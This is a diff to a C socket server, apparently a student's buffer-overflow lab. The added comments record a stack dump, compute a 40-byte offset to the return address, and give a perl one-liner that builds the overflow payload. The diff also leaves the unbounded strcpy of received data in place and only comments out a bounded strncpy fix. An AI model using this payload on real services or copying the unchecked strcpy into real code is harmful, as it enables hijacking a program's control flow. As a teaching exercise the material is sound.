@@ -2,7 +2,13 @@
 // Vivek Khanolkar
 // vkhanolk
 // 4/15/2021
-
+//0x7fffffffdff0: 0x50    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00 - base pointer
+//0x7fffffffdff8: 0xd9    0x0c    0x40    0x00    0x00    0x00    0x00    0x00 - return address
+//0x7fffffffdfd0 - string address
+//0x7fffffffdff8: 0x18    0x0e    0x40    0x00    0x00    0x00    0x00    0x00
+//return address - string address = 28 hex = 40 decimal
+//‘perl -e ’print "A" x 40 . "\x18\x0e\x40\x00"’‘
+//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x0e\x40\x00
 /*
 / file : server.c
 /------------------------------------------
@@ -123,8 +129,9 @@ char * clientComm(int clntSockfd,int * senderBuffSize_addr, int * optlen_addr){
         exit(1);
     }    
 
+    //need to limit the amount of data strcpy can 'copy' to five bytes.
     strcpy(str, recvBuff);
-	
+	//strncpy(str, recvBuff, 5); //this will limit number of characters being allowed to copy
     /* send data to the client */
     if (send(clntSockfd, str, strlen(str), 0) == -1) {
         perror("send failed");
